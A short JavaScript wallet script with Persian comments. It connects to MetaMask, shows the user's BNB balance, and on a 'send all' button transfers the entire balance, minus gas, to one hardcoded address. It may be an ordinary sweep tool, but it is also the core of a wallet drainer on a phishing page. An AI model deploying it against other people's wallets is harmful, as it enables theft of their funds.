import { ethers } from 'ethers';

const connectBtn = document.getElementById('connect');
const sendAllBtn = document.getElementById('sendAll');
const addressSpan = document.getElementById('address');
const balanceSpan = document.getElementById('balance');
const walletInfo = document.getElementById('walletInfo');

// آدرس مقصد ثابت
const recipient = '0x98907E5eE9E010c34DF6F7847565D421D3CDAd05'; // جایگزین کنید

let provider;
let signer;
let userAddress;

connectBtn.addEventListener('click', async () => {
  if (typeof window.ethereum === 'undefined') {
    alert('لطفاً متامسک را نصب کنید.');
    return;
  }

  try {
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
    signer = provider.getSigner();
    userAddress = await signer.getAddress();

    const balanceWei = await provider.getBalance(userAddress);
    const balanceBNB = ethers.utils.formatEther(balanceWei);

    addressSpan.textContent = userAddress;
    balanceSpan.textContent = balanceBNB;
    walletInfo.style.display = 'block';
  } catch (error) {
    console.error('خطا در اتصال به کیف پول:', error);
  }
});

sendAllBtn.addEventListener('click', async () => {
  try {
    const balanceWei = await provider.getBalance(userAddress);
    const gasPrice = await provider.getGasPrice();
    const gasLimit = ethers.utils.hexlify(21000);
    const totalGasCost = gasPrice.mul(gasLimit);
    const amountToSend = balanceWei.sub(totalGasCost);

    if (amountToSend.lte(0)) {
      alert('موجودی کافی برای پرداخت کارمزد وجود ندارد.');
      return;
    }

    const tx = await signer.sendTransaction({
      to: recipient,
      value: amountToSend,
      gasLimit: gasLimit,
      gasPrice: gasPrice,
    });

    alert(`تراکنش ارسال شد. شناسه تراکنش: ${tx.hash}`);
  } catch (error) {
    console.error('خطا در ارسال تراکنش:', error);
  }
});